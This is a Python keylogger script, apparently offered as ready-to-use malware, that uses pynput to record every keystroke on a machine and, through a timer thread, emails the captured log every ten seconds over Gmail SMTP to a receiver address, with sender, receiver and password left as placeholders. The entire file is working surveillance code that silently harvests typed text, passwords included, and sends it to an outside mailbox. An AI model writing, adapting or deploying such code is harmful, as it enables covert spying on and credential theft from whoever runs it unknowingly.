import smtplib
from pynput import keyboard
from threading import Timer
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

log = ""

def keyChecker(key):
    global log 
    if key == key.f1:
        log += " [F1]"
    elif key == key.f2:
        log += " [F2]"
    elif key == key.f3:
        log += " [F3]"
    elif key == key.f4:
        log += " [F4]"
    elif key == key.f5:
        log += " [F5]"
    elif key == key.f6:
        log += " [F6]"
    elif key == key.f7:
        log += " [F7]"
    elif key == key.f8:
        log += " [F8]"
    elif key == key.f9:
        log += " [F9]"
    elif key == key.f10:
        log += " [F10]"
    elif key == key.f11:
        log += " [F11]"
    elif key == key.f12:
        log += " [F12]"
    elif key == key.space:
        log += " " 
    elif key == key.backspace:
        log += " [BACK] "
    elif key == key.ctrl:
        log += " [CTRL] "
    elif key == key.ctrl_r:
        log += " [CTRLR] "
    elif key == key.alt:
        log += " [ALT] "
    elif key == key.shift:
        log += " [SHIFT] "
    elif key == key.shift_r:
        log += " [SHIFTR] "
    elif key == key.enter:
        log += " [ENTER] "
    elif key == key.tab:
        log += " [TAB] "
    elif key == key.caps_lock:
        log += " [CAPSL] "
    elif key == key.num_lock:
        log += " [NUML] "
    elif key == key.cmd:
        log += " [CMD] "
    elif key == key.esc:
        log += " [ESC] "
    elif key == key.delete:
        log += " [DEL] "
    elif key == key.print_screen:
        log += " [PRTSC] "
    elif key == key.home:
        log += " [HOME] "
    elif key == key.page_up:
        log += " [PGUP] "
    elif key == key.page_down:
        log += " [PGDOWN] "
    elif key == key.end:
        log += " [END] "
    elif key == key.left:
        log += " [LEFT] "
    elif key == key.right:
        log += " [RIGHT] "
    elif key == key.down:
        log += " [DOWN] "
    elif key == key.up:
        log += " [UP] "
    else:
        log += str(key)
def callback_function(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        keyChecker(key)

def sendEmail(sender,receiver,password,log):
    server = smtplib.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(sender,password)
    server.sendmail(sender,receiver,log)

def thread():
    global log
    if len(log) > 10:
        message = MIMEMultipart("")
        message["Subject"] = "Flogger"

        part1 = MIMEText(log, "plain")
        message.attach(part1)
        msg = message.as_string()

        sendEmail({SENDER_EMAIL},{RECEIVER_EMAIL},{PASSWORD},msg)

        log = ""

    timer = Timer(10,thread)
    timer.start()

keylogger = keyboard.Listener(on_press=callback_function)
with keylogger:
    thread()
    keylogger.join()

